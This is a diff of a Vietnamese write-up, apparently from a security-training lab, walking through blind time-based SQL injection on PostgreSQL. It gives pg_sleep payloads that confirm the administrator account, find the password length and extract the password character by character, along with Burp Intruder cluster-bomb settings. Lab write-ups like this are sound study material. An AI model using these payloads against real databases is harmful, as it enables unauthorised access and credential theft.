@@ -72,9 +72,33 @@ Vậy table có tồn tại với column `username` và `password`, bao gồm en
 'SELECT+CASE+WHEN+(username='administrator'+AND+LENGTH(password)>1)+THEN+pg_sleep(10)+ELSE+pg_sleep(0)+END+FROM+users-- 
 ```
 
-Nếu 1 trong 2 điều kiện không đúng thì kết quả trả về sẽ không có độ trễ, do đó ta đã biết được rằng username là administrator và độ dài của chuỗi password phải lớn hơn 1.
+Nếu có tồn tại username  `administrator` và độ dài của chuỗi password > 1 thì khi đó, kết quả trả về sẽ có độ trễ.
 
-Ta tiếp tục thử đển khi giá trị độ dài của chuỗi password > 20 thì khi đó kết quả trả về sẽ không có độ trễ. Do đó ta có thể suy ra được độ dài của chuỗi bao gồm 20 kí tự.
+![image](https://user-images.githubusercontent.com/115911041/235216254-c7662cbe-9f7d-4dd6-a168-1ce1eb14720d.png)
+
+![image](https://user-images.githubusercontent.com/115911041/235216375-731a14d0-67e8-4b9f-bb39-95817bc22adf.png)
+
+![image](https://user-images.githubusercontent.com/115911041/235216474-37fa7754-dd1d-4eab-963a-ae1efe8e1c58.png)
+
+Vậy độ dài của password là 20
+
+# Liệt kê password
+
+Để liệt kê password thì khá đơn giản, chỉ bằng cách kiểm tra từng kí tự của passowrd thay vì độ dài. Mình sử dụng resource pool cũ giống ở trên
+
+`'||(SELECT pg_sleep(3) FROM users WHERE username='administrator' AND SUBSTR(password,1,1)='a')||'`
+
+![image](https://user-images.githubusercontent.com/115911041/235217181-7192945f-2b07-42a5-9351-772297509ffa.png)
+
+Sử dụng Burp Intruder, Attack Type: **Cluster bomb**
+
+Payload 1: numeric
+
+Payload 2: brute force
+
+
+
+
 
 
 
